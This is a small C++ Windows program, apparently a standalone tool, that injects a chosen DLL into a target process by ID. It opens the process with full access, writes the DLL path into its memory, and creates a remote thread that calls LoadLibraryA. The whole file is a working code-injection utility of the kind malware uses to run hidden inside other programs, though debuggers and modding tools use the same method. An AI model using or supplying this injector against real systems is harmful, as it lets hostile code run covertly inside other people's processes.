#include <Windows.h>

// DLL injection

#include <stdio.h>

int main(int argc, char * argv[]) {
	if (argc < 3) {
		printf("[-] Usage : %s <dll> <pid>\n", argv[0]);
		return 0;
	}

	LPCSTR dll = argv[1];
	DWORD pid = atoi(argv[2]);

	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		printf("[-] Unable to open process.\n");
		return 1;
	}

	LPVOID r_mem = ::VirtualAllocEx(hProcess, NULL, strlen(dll), MEM_COMMIT, PAGE_READWRITE);
	if (!r_mem) {
		printf("[-] Unable to allocate memory.\n");
		return 1;
	}

	if (!::WriteProcessMemory(hProcess,r_mem, dll, strlen(dll), NULL)) {
		printf("[-] Unable to write to process memory.\n");
		return 1;
	}
	
	LPVOID loadlibrary = ::GetProcAddress(::GetModuleHandleW(L"Kernel32"), "LoadLibraryA");

	if (!::CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadlibrary, r_mem, 0, NULL)) {
		printf("[-] Unable to create remote thread.\n");
		return 1;
	}

	return 0;
}
